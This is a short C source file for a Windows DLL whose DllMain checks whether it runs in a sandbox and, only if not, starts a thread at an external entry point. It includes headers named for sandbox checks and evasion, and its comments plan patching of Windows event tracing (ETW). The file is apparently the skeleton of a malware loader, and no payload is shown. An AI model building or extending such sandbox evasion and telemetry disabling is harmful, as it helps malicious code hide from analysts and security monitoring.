#include <windows.h>

#include "sandbox.h"
#include "evasion.h"
#include "entrypoint.h"

// AutoLoader later

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    (void)hinstDLL; (void)lpvReserved;
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Check if the process is sandboxed
        if (is_sandboxed()) {
            //unload the DLL if sandbox checks fail
        } else {
            // ETW patching maybe here
            // disable_etw();

            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entrypoint, NULL, 0, NULL);
        }
    }
    return TRUE;
}
